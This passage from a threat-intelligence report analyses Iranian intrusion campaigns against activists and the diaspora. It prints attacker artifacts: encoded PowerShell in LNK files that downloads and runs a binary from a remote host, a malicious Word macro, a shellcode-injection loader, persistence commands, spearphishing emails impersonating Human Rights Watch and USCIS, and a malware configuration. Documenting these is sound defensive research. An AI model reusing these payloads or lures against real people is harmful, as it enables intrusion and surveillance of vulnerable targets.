(“5­server.us”, “6­server.us”, “ghalpaq.us”, “pashmool.com”. “kashkoolak.com”) indicate continued,\nlarge scale abuse of Telegram’s API in support intrusion activities conducted against users of the\napplication.\n\nSpearphishing is not the only means of intrusion into Telegram accounts. The common form of\nauthentication for most mobile chat applications is through providing the user an access code that is sent\nby SMS message to the user. Since SMS messages are subject to interception and surveillance by\ntelecommunications networks, the user’s phone service therefore has access to their password.\nAdditionally, mobile networks are vulnerable to a wide range of attacks, from social engineering of\nproviders to attacks on systems that allow phones to roam across networks. In practice, an attacker could\nconvince or compell a mobile provider to issue a copy of the target’s SIM card and receive messages\nbound for that user, including their access code. These tactics have been documented in Egypt and Russia.\nBased on accounts from multiple individual inside of the country, these tactics appear to have been used\nin Iran in order to gain access to the Telegram accounts of individuals connected with influential political\nopposition figures, women’s rights activists and other surveillance targets.\n\n30\n\n\n-----\n\n#### Metasploit\n\nFrom the outset of publicity on Rocket Kitten’s operations, researchers have identified a reliance on\nsimple tactics and commercial­off­the­shelf tools in order to capture credentials and acquire access to\ndevices. In late 2014, these operations were conducted through CORE Impact, shifting over the following\nyear to other agents. Since then, in particular since Spring 2016, we find an increasing use of the\nMetasploit Meterpreter agent coupled with basic social engineering practices as the primary mechanism\nof intrusions of Rocket Kitten.\n\nRocket Kitten’s tactics over the duration of our observation continue a common pattern. When one\nindividual was compromised by an unknown mechanism, the attacker accessed their social networking\naccounts from a VPN service in Florida. The first action of the intruder was to download an archive of\ntheir personal data through Facebook’s Download Your Information tool (documented by the notification\nemail received from Facebook), and then change the account email address. Once compromised, the\nintruders impersonated the victim and over Facebook message began to approach dozens of their contacts\nin the media, sending a compressed archive claiming to be a set of pictures.\n\nAt the same time, a Telegram account portraying a young woman named “Hoda Hajibagher” began to\nengage members of the diaspora, sending provocative pictures and promising more pictures at a link. The\nlinks would lead to a Google credential phishing page that resembled the structure and tactics of Rocket\nKitten attempts over the previous year. Concurrently, a Gmail account for Hajibagher also began to\nengage others over email, sending a document containing malware embedded as a macro in a Word\ndocument (Document.docm). Since this initial set of incidents, the same actors have continued on to\ncreate fake Facebook resources in order to host malware attempts or to support fictitious personas used in\nmore elaborate social engineering schemes.\n\n31\n\n\nmore elaborate social engineering schemes.\n\n\n-----\n\n**Impersonation Facebook Page (July 2016)**\n\nBoth the bait document from Hoda and the pictures from the compromised account are malware that\nappear to be connected to the same set of actors employing Meterpreter as reverse shell into compromised\nsystems. Images of women and politics as bait documents would be intermingled with a dropper (a\nshortcut file embedded with powershell) that would connect to a remote server to retrieve an agent,\nincluding potentially Android version of the Meterpreter toolkit. These backend servers also commonly\nexposed installations of the Metasploit framework. In the attacks we observed victims were sent archives\ncalled “Copy of photos.rar​ ” normally containing four distinct .LNK files: ​\n\nThe LNK files have the following properties, with very minor changes to the payloads:\n\n[Link Info]\nLocation flags:             0x00000001\n(VolumeIDAndLocalBasePat\nh)\nDrive type:               3        (DRIVE_FIXED)\nDrive serial number:          703c­a852\nVolume label (ASCII):\nLocal path (ASCII):\nC:\\Windows\\System32\\WindowsPowerShell\\v1\n.0\\powershell.exe\n\n[String Data]\nComment (UNICODE):           windows photo viewer\nRelative path (UNICODE):\n..\\..\\..\\..\\Windows\\System32\\WindowsPowe\nrShell\\v1.0\\powershell.exe\nArguments (UNICODE):\n\n32\n\n\n-----\n\n­NoProfile ­NonInteractive ­ExecutionPolicy Bypass ­WindowStyle Hidden\n­En\ncodedCommand\nSQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQB\nyADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgBoAHQAdABwADoALwAvAHUAcABsAG8AY\nQB\nkAGUAcgAuAHMAeQB0AGUAcwAuAG4AZQB0AC8AZABvAHcAbgBsAG8AYQBkAC8AcwBsAGkAZABlAHMAa\nAB\nvAHcALwAxAC4AagBwAGcAIgA7AFMAdABhAHIAdAAtAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByACAAa\nAB\n0AHQAcAA6AC8ALwB1AHAAbABvAGEAZABlAHIALgBzAHkAdABlAHMALgBuAGUAdAAvAGQAbwB3AG4Ab\nAB\nvAGEAZAAvAHMAaABvAHIAdABjAHUAdAAuAGUAeABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcADIAN\nQA\nwAEMAOABDAEEANwBCAC4AZQB4AGUAIgA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAJ\nAB\nlAG4AdgA6AFQARQBNAFAAXAAyADUAMABDADgAQwBBADcAQgAuAGUAeABlACIA\nIcon location (UNICODE):        %SystemRoot%\\SYSTEM32\\shell32.dll\n\nAs you can see, the LNK files are tasked to execute a PowerShell payload, which decodes as following:\n\nImport­Module BitsTransfer; Start­Process\n\"hxxp://uploader.sytes.net/download/slideshow/3.jpg\";Start­BitsTransfer\nhxxp://uploader.sytes.net/download/shortcut.exe \"$env:TEMP\\250C8CA7B.exe\";\nStart­Process \"$env:TEMP\\250C8CA7B.exe\n\nThe payload triggers the default browser to open an image at a given URL, which points to a different\nimage in each .LNK file, then downloads and execute a Windows binary.\n\nIn separate attacks, as previously mentioned, we observed a malicious Office document ​Document.docm\ninstead being distributed to victims. Notably, this document was created with a pirated version of Office\ndistributed in Iran. The attack did not leverage any vulnerability but simply embedded a Macro script 38\n\nand attempted to deceive the targets in enabling it:\n\n38 “MRT Win2Farsi.com”\n\n33\n\n\n-----\n\nThe content of the Macro is the following:\n\nPrivate Sub Document_Open()\nDim x\nx = \"powershell ­window hidden ­enc\nJAA5AHQAMQBpACAAPQAgACcAJABkAHoANwBkAEwAIAA9ACAAJwAnAFsARABsAGwASQBtAHAAbwByAH\nQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABp\nAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKA\nBJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUA\nLAAgAHUAaQBuAHQAIABmAGwAQQBsAGwAbwBjA\" _\n&\n\n[CUT FOR CONVENIENCE]\n\n\"gAmACAAJABkAHoANwBLAEEAIAAkAFEANgBQAGkAIAAkAGUAIgB9AGUAbABzAGUAewA7AGkAZQB4AC\nAAIgAmACAAcABvAHcAZQByAHMAaABlAGwAbAAgACQAUQA2AFAAaQAgACQAZQAiADsAfQA=\"\nShell (\"POWERSHELL.EXE \" & x)\nDim title As String\ntitle = \"Critical Microsoft Office Error\"\nDim msg As String\nDim intResponse As Integer\n\n34\n\n\n-----\n\nintResponse = MsgBox(msg, 16, title)\nEnd Sub\n\nIf enabled, it will display an empty fake error dialog while executing a PowerShell payload in the\nbackground. In both cases through the infection process, a cabinet file normally called ​taskmanager32.exe\nis pulled, stored, and instantiated for autorun.\n\nThe file then contains an executable called ​BattRunner.exe​ which decompiles as following:\n\nnamespace BattRunner\n{\n\ninternal static class Program\n{\n\n[STAThread]\nprivate static void Main()\n{\n\nApplication.EnableVisualStyles();\nApplication.SetCompatibleTextRenderingDefault(false);\nstring folderPath =\nEnvironment.GetFolderPath(Environment.SpecialFolder.ApplicationData);\n\nFile.WriteAllText(folderPath + \"\\\\start.bat\",\nResources._4545);\n\nint num = Environment.TickCount + 15000;\nwhile (Environment.TickCount <= num)\n{\n}\nFile.WriteAllBytes(folderPath + \"\\\\update.diagcab\",\nResources.WindowsUpdateDiagnostic);\n\nnew Process\n{\n\nStartInfo =\n\n35\n\n\n-----\n\n{\n\nCreateNoWindow = true,\nWindowStyle = ProcessWindowStyle.Hidden,\nFileName = folderPath + \"\\\\start.bat\"\n}\n}.Start();\n}\n}\n}\n\nThis program will simply write an embedded string to the file ​start.bat​ and then execute it.\nThe start.bat​ file contains instructions to execute a PowerShell process with a base64­encoded payload: ​\n\npowershell ­window hidden ­enc [base64 payload]\n\nThe decoded payload is the following:\n\n$Dx8G = '$CeJG = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr\nVirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint\nflProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr\nCreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr\nlpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr\nlpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr\ndest, uint src, uint count);'';$w = Add­Type ­memberDefinition $CeJG ­Name\n\"Win32\" ­namespace Win32Functions ­passthru;[Byte[]];[Byte[]]$z =\n0xda,0xcc,0xd9,0x74,0x24,0xf4,0xbb,0xb7,0x6a,0x2e,0xe9,0x5d,0x33,0xc9,0xb1,0x4\n7,0x31,0x5d,0x18,0x83,0xc5,0x04,0x03,0x5d,0xa3,0x88,0xdb,0x15,0x23,0xce,0x24,0\nxe6,0xb3,0xaf,0xad,0x03,0x82,0xef,0xca,0x40,0xb4,0xdf,0x99,0x05,0x38,0xab,0xcc\n,0xbd,0xcb,0xd9,0xd8,0xb2,0x7c,0x57,0x3f,0xfc,0x7d,0xc4,0x03,0x9f,0xfd,0x17,0x\n50,0x7f,0x3c,0xd8,0xa5,0x7e,0x79,0x05,0x47,0xd2,0xd2,0x41,0xfa,0xc3,0x57,0x1f,\n0xc7,0x68,0x2b,0xb1,0x4f,0x8c,0xfb,0xb0,0x7e,0x03,0x70,0xeb,0xa0,0xa5,0x55,0x8\n7,0xe8,0xbd,0xba,0xa2,0xa3,0x36,0x08,0x58,0x32,0x9f,0x41,0xa1,0x99,0xde,0x6e,0\nx50,0xe3,0x27,0x48,0x8b,0x96,0x51,0xab,0x36,0xa1,0xa5,0xd6,0xec,0x24,0x3e,0x70\n,0x66,0x9e,0x9a,0x81,0xab,0x79,0x68,0x8d,0x00,0x0d,0x36,0x91,0x97,0xc2,0x4c,0x\nad,0x1c,0xe5,0x82,0x24,0x66,0xc2,0x06,0x6d,0x3c,0x6b,0x1e,0xcb,0x93,0x94,0x40,\n0xb4,0x4c,0x31,0x0a,0x58,0x98,0x48,0x51,0x34,0x6d,0x61,0x6a,0xc4,0xf9,0xf2,0x1\n9,0xf6,0xa6,0xa8,0xb5,0xba,0x2f,0x77,0x41,0xbd,0x05,0xcf,0xdd,0x40,0xa6,0x30,0\nxf7,0x86,0xf2,0x60,0x6f,0x2f,0x7b,0xeb,0x6f,0xd0,0xae,0x86,0x6a,0x46,0xe8,0xda\n,0x6d,0xf4,0x62,0xe7,0x8d,0xe9,0xb3,0x6e,0x6b,0x59,0x64,0x21,0x24,0x19,0xd4,0x\n81,0x94,0xf1,0x3e,0x0e,0xca,0xe1,0x40,0xc4,0x63,0x8b,0xae,0xb1,0xdc,0x23,0x56,\n0x98,0x97,0xd2,0x97,0x36,0xd2,0xd4,0x1c,0xb5,0x22,0x9a,0xd4,0xb0,0x30,0x4a,0x1\n5,0x8f,0x6b,0xdc,0x2a,0x25,0x01,0xe0,0xbe,0xc2,0x80,0xb7,0x56,0xc9,0xf5,0xff,0\nxf8,0x32,0xd0,0x74,0x30,0xa7,0x9b,0xe2,0x3d,0x27,0x1c,0xf2,0x6b,0x2d,0x1c,0x9a\n,0xcb,0x15,0x4f,0xbf,0x13,0x80,0xe3,0x6c,0x86,0x2b,0x52,0xc1,0x01,0x44,0x58,0x\n3c,0x65,0xcb,0xa3,0x6b,0x77,0x37,0x72,0x55,0x0d,0x59,0x46;$g = 0x1000;if\n($z.Length ­gt 0x1000){$g =\n$z.Length};$cST=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i ­le\n($z.Length­1);$i++) {$w::memset([IntPtr]($cST.ToInt32()+$i), $z[$i],\n1)};$w::CreateThread(0,0,$cST,0,0,0);for (;;){Start­sleep 60};';$e =\n\n36\n\n\n-----\n\n[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Dx8\nG));$S7lO = \"­enc \";if([IntPtr]::Size ­eq 8){$P1X = $env:SystemRoot +\n\"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"& $P1X $S7lO $e\"}else{;iex\n\"& powershell $S7lO $e\";}\n\nThrough multiple nested PowerShell instances performing shellcode injection, the actors are then able to\ndownload and execute a build of Metasploit’s Meterpreter DLL configured as a reverse shell to a\ndesignated host. On a historical note, the primary hostname for these samples was previously used in a\nFBI operation to identify individuals exchange child abuse images. 39\n\nDuring the course of our analysis we observed the attackers interacting with the reverse shell we had\nopened. During multiple attempts at luring them in they initially performed some preliminary profiling,\nthen when they had realized the host was an analysis virtual machine, they repeatedly deleted files,\nremoved traces of the infection and rebooted the system.\n\n### Sima\n\n#### History\n\nIn February 2016, Iran­focused individuals received messages purporting to be from Human Rights\nWatch's (HRW) Emergencies Director, requesting that they read an article about Iran pressing Afghan\nrefugees to fight in Syria. While referencing a real report published by HRW, the links provided for the 40\n\nDirector’s biography and article directed the recipient to malware hosted elsewhere. These spearphishing\nattempts represent an evolution of Iranian actors based on their social engineering tactics and narrow\ntargeting. Although the messages still had minor grammatical and stylistic errors that would be obvious to\na native speaker, the actors demonstrated stronger English­language proficiency than past intrusion sets\nand a deeper investment in background research prior to the attempt. The actors appropriated a real\nidentity that would be expected to professionally interact with the subject, then offered validation through\nlinks to their biography and social media, the former of which itself was malware as well. The bait\ndocuments contained a real article relevant to their interests and topic referenced, and the message\nattempted to address to how it aligned with their professional research or field of employment. The\nreferenced documents sent were malware binaries posing as legitimate files using the common\nright­to­left filenames tactic in order to conceal the actual file extension. All of these techniques, while\ncommon pretexting mechanisms, are a refinement compared to a tendency amongst other groups to\nsimply continually send different forms of generic malware or phishing, in the hopes that one would\neventually be successful.\n\nWe tentatively name the campaign “Sima” based on the recurrent presence of “PCSima7” and “PCSima9”\nin the metadata of Word documents displayed upon execution of the primary malware agent. While other\nindicators align with the attribution to Iran, such as markers that the Visual Studio used in its development\noriginated from an Iranian software piracy site, Sima is the most unique trait found in our observation.\n\n39 [http://www.cnet.com/news/fbi­posts­fake­hyperlinks­to­snare­child­porn­suspects/​](http://www.cnet.com/news/fbi-posts-fake-hyperlinks-to-snare-child-porn-suspects/)\n40 [https://www.hrw.org/news/2016/01/29/iran­sending­thousands­afghans­fight­syria​](https://www.hrw.org/news/2016/01/29/iran-sending-thousands-afghans-fight-syria)\n\n37\n\n\n-----\n\nWhile the Sima (ﺳﻴﻤﺎ) moniker could similarly originate from software labels, it is a common female\nPersian name and a Persian­language word for “visage” or “appearance.” Given its use in more advanced\nsocial engineering campaigns against women’s rights activists, the label seem particularly apt.\n\nBased on file modification dates and timestamps of samples, it appears that the observed campaign was\ninitiated in the middle of February 2016, with the infrastructure taken offline at the start of March. At the\ntime of observation, and within the resources in spearphishing attempts, the actors behind the campaign\nhad an active interest in Iranians in the diaspora that were focused on foreign policy and women’s issues.\nSamples and resource names contained the family names of prominent Iranians, and several of these\nindividuals received the malware located in their respective folder. Two other files, named “R.A.D ­ Rape\nAggression Defense for Women” and “VictoriaSecret influence on women gender” indicate an audience\nof activists or scholars on women’s rights issues. Another file, entitled “CONFIDENTIAL INVESTOR\nSUITABILITY QUESTIONNAIRE” implies that the end recipient is involved in the private sector,\nwhich aligns with a history of Iranian actors of targeting individuals involved with the country’s oil sector\nand international businesspersons in the diaspora. Others appear to have been general purpose malware\nwith generic names that imply that they were sent purporting to be system updates, such as\n“GetWindows10­Web_Default_Attr.exe.”\n\nSeveral samples potentially reflect other impersonation attempts similar to the HRW messages based on\nthe filenames of the malware. The spearphishing bait was relevant to recent social media activity of the\ntarget, suggesting those behind the Sima campaign were closely monitoring and tailoring pretexting\nstrategies according to their interests. In another case, the actors mirrored an announcement made about\nthe broadcast of a television program on Iranian­American cultural affairs in order to impersonate the\nindividual and engage in spearphishing within hours of the legitimate message. The Sima group also\nengaged in impersonation of Citizenship and Immigration Services at the Department of Homeland\nSecurity, posing as a notice about the expiration of the recipient’s Permanent Residence status. This\nforged message appeared to be from an address associated with the USCIS, “SCOPSSCATA@dhs.gov,”\nand was sent through the anonymous mail relay service anonymousemail.me. As with the HRW message,\nthe forms referenced actually exist but the links provided in the message directed the recipient to malware\ntainted documents.\n\n38\n\n\n-----\n\nThe malware and infrastructure used in the spearphishing attempts was hosted behind an under\nconstruction message with an email signup option that did not function. The server used to host these\nmalware samples was located on the German provider Hetzner (148.251.55.114), within a small block of\nIP addresses that are registered with the customer ID “HOS­156205.” Across other prefixes registered to\nthis customer identifier, and within the same block as the command and control server, there are a number\nof other Persian­language websites, suggesting that the server was purchased through an Iranian reseller\nof Hetzner services.\n\nPrior to the removal of the server, the actors uploaded password­protected archives of exfiltrated files to\nthe server. These files suggested at least twenty­one victims within the short period of the campaign,\nhowever, it is believed that those archives do not covered the entirety of those compromised. Despite the\noversight that made these files available, the archives evince a greater level of professionalism and\ndetail­oriented work than previous threat actors, with resources highly­organized and bearing descriptive\nlabeling. These archives provide further indication that those entities behind the campaigns are\nPersian­language speakers, due to the naming of files and folders in Persian.\n\n**Spearphishing Email ­ February and March 2016**\n\nFrom: Peter Bouckaert [redacted ­ unique false email address] ​\n\n[redacted ­ name]\n\nHello\n\nI am Peter Bouckaert, Emergency director at Human Rights Watch, focusing on protecting the rights of civilians during armed conflict. Our\ngroup has huge field research & fact­finding missions to Iran, Lebanon, Kosovo, Chechnya, Afghanistan, Iraq, Israel and the Occupied\nPalestinian Territories, Macedonia, Indonesia, Uganda, and Sierra Leone, among others.\n\nYou can read my biography at below link:\nhttps://www.hrw.org/about/people/peter­bouckaert\n<http://148.251.55.114/download/[redacted]​ ​/my%20biography%E2%80%AExcod.scr>\n\nAccording to the situation of Iran & Turkey in terrorism in Syria, we have some suggestions for you due to your experience ​[redacted ­ field]​.\nPlease read our last research about “Iran Sending Thousands of Afghans to Fight in Syria” & contact me immediately.\n\nYou can read this article at below link:\nhttps://www.hrw.org/news/2016/01/29/iran­sending­thousands­afghans­fight­syria\n\n39\n\n\n-----\n\n<http://148.251.55.114/download/[redacted]​ ​/Iran%20Sending%20Thousands%20of%20Afghans%20to%20Fight%20in%20Syria%E2%80%\nAExcod.scr>\n\nPeter Bouckaert\n\n[redacted ­ unique false email address]\n\n**Spearphishing Email ­ March 2016**\n\nFrom: U.S. Citizenship and Immigration Services <SCOPSSCATA@dhs.gov>\nSubject: Alert: Permanent Residence Card\n\nYou received this Email because you do not have a Permanent Residence, your Permanent Residence status needs to be adjusted or you need\nto renew/replace your Permanent Residence Card.\n\nStarting March 9, 2016, customers must fill Form I­485 (can be found at the end of this email), in order to Register Permanent Residence or\nAdjust Status, and must fill Form I­90 (can be found at the end of this email) in order to Renew/Replace Permanent Residence Card and mail\ntheir Form I­485 or I­90 to USCIS local field/International offices. (Offices can be found here:\nhttps://www.uscis.gov/about­us/find­uscis­office)\n\nUSCIS will provide a 30 day grace period from March 9, 2016, for customers who file their Form I­485 or I­90 with one of the USCIS offices.\nAll offices who receive Form I­485 and I­90 during this time will forward the forms to the Chicago Lockbox.\n\nAfter April 9, 2016, local field/International offices will return all Form I­485 and I­90 they receive and advise customers to file at the\nChicago Lockbox.\n\nDownload Form I­485, Application to Register Permanent Residence or Adjust Status:\nhttps://www.uscis.gov/sites/default/files/files/form/i­485.doc\n<http://148.251.55.114/uscis.gov/sites/default/files/files/form/Form%20I­485,%20Application%20to%20Register%20Permanent%20Residen\nce%20or%20Adjust%20Status%E2%80%AEcod.scr>\n\nDownload Form I­90, Application to Replace Permanent Resident Card: https://www.uscis.gov/sites/default/files/files/form/i­90.doc\n<http://148.251.55.114/uscis.gov/sites/default/files/files/form/Form%20I­90,%20Application%20to%20Replace%20Permanent%20Resident\n%20Card%E2%80%AEcod.scr>\n\nContact us: https://www.uscis.gov/about­us/contact­us\n\nWith Best Regards,\n\nUSCIS Service Center.\n\n#### Tools & Techniques\n\nAll the malware samples that we collected from servers controlled by the actors appear to belong to the\nsame malware family and they are all configured to contact and exfiltrate data to the same command and\ncontrol domains, microupdt.fagdns.com​ ​ and microupdt.duckdns.org​ ​. All the samples appear to be have\nbeen compiled between February 29 and March 1 2016, shortly before our discovery, suggesting that,\ndespite the known C&C servers having quickly gone offline shortly after, this spree of attacks might be\nfresh and currently undergoing.\n\nIt is worth noting in fact, that those same C&C domains have appeared and disappeared at convenience\nover the course of the many months that took to complete this research work, and may be used by others.\nAs a matter of fact, the command and control domains we observed resolved to the hosts 154.127.59.97\nand 87.121.52.83, which have numerous other domains associated to them through passive DNS records,\nand an even larger amount of malware samples configured to contact them. For the sake of narrative we\n\n40\n\n\n-----\n\nare going to focus exclusively to those samples we identified being used in attacks against Iranian civil\nsociety and diaspora.\n\nWe observed Sima employ a few initial droppers, normally written in C# and then obfuscated, often with\nSmartAssembly. The first iteration of the stage 1 payload is a very simple application that is designed to\nexecute the primary payload, and establish and maintain persistence over the compromised system. It\nachieves that by the creating a regular startup registry key by invoking the following command:\n\n\"C:\\WINDOWS\\system32\\cmd.exe\" /c reg add\n\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v\n\"Load\" /d \"C:\\Documents and Settings\\Me\\Application\nData\\Microsoft\\Blend\\14.0\\FeedCache\\protocolhost.exe\" /f\n\nThe binary protocolhost.exe​ would normally be an initial stub that just executes the full original payload. ​\nWhile the folder under which it is stored seems consistent, the file name of the executable seems to vary.\nWe observed for example the names ​sigverify.exe​ and PerfWatson.exe​ ​ as alternatives to ​protocolhost.exe​.\nInterestingly, due to some flaw in the logic of the stage 1, that ​cmd.exe​ command is often executed an\nendless loop, which will cause terminals to flash continuously, making it hard to properly interact with the\nsystem.\n\nPossibly as an evolution to this poorly designed initial payload, in other attacks the group appears to have\nreplaced the stage 1 dropper with a new one, which looks cleaner and with an increased attention to detail\nand stealthiness. For example, it sets the ZoneID of all of its dropped files to URLZONE_TRUSTED,\ngenerally used to disable security warnings on the provenance of the file, invoking this command:\n\n\"C:\\Windows\\System32\\cmd.exe\" /c echo [zoneTransfer]ZoneID = 2 >\n\"C:\\ProgramData\\Winupdt\\winupdt.exe\":ZONE.identifier & exit\n\nIt also sets its error mode to SEM_NOOPENFILEERRORBOX, disabling Windows error dialogs in case\nof some malfunction.\n\nInstead of using the more common and more recognizable Windows startup registry keys and folders, this\nmalware instead creates a Window Task Scheduler XML definition from a premade template it is\nprovided with:\n\n<?xml version=\"1.0\" encoding=\"utf­16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n<RegistrationInfo>\n<Date>2014­10­25T14:27:44.8929027</Date>\n<Author>[USERID]</Author>\n</RegistrationInfo>\n<Triggers>\n<LogonTrigger>\n<Enabled>true</Enabled>\n<UserId>[USERID]</UserId>\n</LogonTrigger>\n\n41\n\n\n-----\n\n<RegistrationTrigger>\n<Enabled>false</Enabled>\n</RegistrationTrigger>\n</Triggers>\n<Principals>\n<Principal id=\"Author\">\n<UserId>[USERID]</UserId>\n<LogonType>InteractiveToken</LogonType>\n<RunLevel>LeastPrivilege</RunLevel>\n</Principal>\n</Principals>\n<Settings>\n<MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>\n<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n<AllowHardTerminate>false</AllowHardTerminate>\n<StartWhenAvailable>true</StartWhenAvailable>\n<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n<IdleSettings>\n<StopOnIdleEnd>true</StopOnIdleEnd>\n<RestartOnIdle>false</RestartOnIdle>\n</IdleSettings>\n<AllowStartOnDemand>true</AllowStartOnDemand>\n<Enabled>true</Enabled>\n<Hidden>false</Hidden>\n<RunOnlyIfIdle>false</RunOnlyIfIdle>\n<WakeToRun>false</WakeToRun>\n<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n<Priority>7</Priority>\n</Settings>\n<Actions Context=\"Author\">\n<Exec>\n<Command>[LOCATION]</Command>\n</Exec>\n</Actions>\n</Task>\n\nAfter [USERID] and [LOCATION] are respectively replaced with the current user name and the path to\nthe previously dropped file, this task definition will be registered in Windows as “WinUpdt” by invoking\nthe following command:\n\n\"C:\\Windows\\System32\\schtasks.exe\" /Create /TN \"WinUpdt\" /XML\nC:\\Users\\User\\AppData\\Local\\Temp\\633249106.xml\n\nInterestingly, this task definition template seems to be designed to be less pervasive as well as less\nsuspicious. As a matter of fact, it fakes the date of registration of task to more than a year and a half ago,\nit only requests a default low­medium priority, it is not marked as hidden, and it even instructs the\nscheduler to terminate the task if the computer is on battery power.\n\nRegardless of which stage 1 dropper was employed, when the primary payload is executed it instantiates\nan instance of RegAsm.exe​ (which is a legitimate Microsoft .NET utility) in a suspended state, performs ​\nprocess hollowing, and replaces its memory with malicious code. All the significant operations of the\nmalware are then performed within the context of that process. In all the attacks that we observed, the\ninjected payload appears to be a RAT known as LuminosityLink​ ​, which is commercially available\n\n42\n\n\n-----\n\noff­the­shelf . While being advertised on its website as a legitimate remote administration tool, 41\n\n_LuminosityLink is provided with enough features to make it an appealing solution for any malicious ​_\nattacker, and Persian­language security forums includes discussion of the application. 42\n\nIn order to deceive the targets of the attacks and making the delivered payload appear more innocuous, all\nthe artifacts have been configured to display an Office document with varying content. These documents\nsuggest the nature of the targets, which generally aligns with the identity of those identified through the\nnames given by the attackers to the folders we retrieved the files from. All the attacks can be classified\nunder two primary thematic areas: ​Women Rights and​ **Human Rights in Iran​** . Therefore, the content of ​\nthe decoy documents along, with what we believe are the identities of some of the targets of these attacks,\nsupports the theory that this campaign is, to the best of our knowledge, dedicated to the surveillance of\nmembers of Iranian civil society and diaspora.\n\n_Human Rights in Iran_\n\n41 [https://luminosity.link​](https://luminosity.link/)\n42 [http://iedb.ir/acc/da­86­da­af­d9­88­d9­86­d9­87­d8­a7­d8­b2­db­8c­da­a9­d8­b1­t­2836.html​](http://iedb.ir/acc/da-86-da-af-d9-88-d9-86-d9-87-d8-a7-d8-b2-db-8c-da-a9-d8-b1-t-2836.html)\n\n43\n\n\n-----\n\nThis decoy document appears to be copied text from a public review of human rights reports by Human\nRights Watch and Freedom House posted by the Iranian human rights organization Tavaana: 43\n\n**Samples**\n\n\n6c87fd4da4a655987d880aa687825283\n93dcbbd44c53ae780a359baa4ba26da2\n0239f8e9e9f242747607e5f7839d2b75\n\nThe following decoy documents instead appears to be a copy of an original report published by Human\nRights Watch on their website: 44\n\n43 [https://tavaana.org/fa/HR_Reports​](https://tavaana.org/fa/HR_Reports)\n44 [https://www.hrw.org/news/2016/01/29/iran­sending­thousands­afghans­fight­syria​](https://www.hrw.org/news/2016/01/29/iran-sending-thousands-afghans-fight-syria)\n\n\n44\n\n\n-----\n\n**Samples**\n\n\nba20e6d986d51c874fa91e4ceab25583\n\nThis decoy document appears to be the biography of the Director of Emergencies at Human Rights\nWatch, as directly taken from their website: 45\n\n45 [https://www.hrw.org/about/people/peter­bouckaert​](https://www.hrw.org/about/people/peter-bouckaert)\n\n\n45\n\n\n-----\n\n**Samples**\n\n879a0b89a1e45a4443e36862fec07954\n\n## End Note\n\nAs noted previously, this document is only a first release in a more ambitious endeavour, covering a slim\nsubsection of the activities targeting Iranian civil society and political opposition. We invite the\ninformation security to share their experiences and insight, and most importantly samples, toward the\nbroader mission of documenting Iran’s historical activities in this area, and are happy to provide citations.\n\n## Acknowledgements\n\nThe authors of this paper would like to sincerely thank the following individuals and organizations, in no\nparticular order: Snorre Fagerland, Morgan Marquis­Boire, DomainTools, Amir Rashidi (International\nCampaign for Human Rights in Iran), Nariman Gharib, Nima Fatemi, and Simin Kargar, amongst the\ndozens of others who have provided meaningful support throughout this process.\n\n46\n\n\n-----\n\n## Appendix\n\n#### Ghambar Configuration\n\n[APP_EXE_FILE_NAME, MSPavilion.exe]\n\n[APPLICATION_NAME, Pavilion]\n\n[CommandPromptPathName, CSP]\n\n[ConfigFileContent, <?xml version=\"1.0\" encoding=\"utf­8\"?>\n<configuration>\n<configSections>\n<sectionGroup name=\"userSettings\"\ntype=\"System.Configuration.UserSettingsGroup, System, Version=2.0.0.0,\nCulture=neutral, PublicKeyToken=b77a5c561934e089\" >\n<section name=\"Roadrunner.Properties.Settings\"\ntype=\"System.Configuration.ClientSettingsSection, System, Version=2.0.0.0,\nCulture=neutral, PublicKeyToken=b77a5c561934e089\"\nallowExeDefinition=\"MachineToLocalUser\" requirePermission=\"false\" />\n</sectionGroup>\n</configSections>\n<startup>\n<supportedRuntime version=\"v2.0.50727\"/>\n</startup>\n<system.serviceModel>\n<bindings />\n<client />\n</system.serviceModel>\n<userSettings>\n<Roadrunner.Properties.Settings>\n<setting name=\"ShortPeriodSeconds\" serializeAs=\"String\">\n<value>5000</value>\n</setting>\n<setting name=\"MediumPeriodSeconds\" serializeAs=\"String\">\n<value>30000</value>\n</setting>\n<setting name=\"LongPeriodSeconds\" serializeAs=\"String\">\n<value>60000</value>\n</setting>\n</Roadrunner.Properties.Settings>\n</userSettings>\n</configuration>]\n\n[EncryptionKey, 100]\n\n[FirstExecuteFileName, DFT.dft]\n\n[JPGFilename, ]\n\n[KeyloggerPathName, KSP]\n\n\n47\n\n\n-----\n\n[LIMIT_KEY_LOGGER_LOG_SIZE, 300]\n\n[PDFFilename, ]\n\n[PluginPathName, DSP]\n\n[RegFileFormat, Windows Registry Editor Version 5.00\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"{0}\"=\"{1}\"]\n\n[ScreenshotPathName, SSP]\n\n[STARTUP_KEY_NAME, MSPavilion]\n\n[StartupKey, 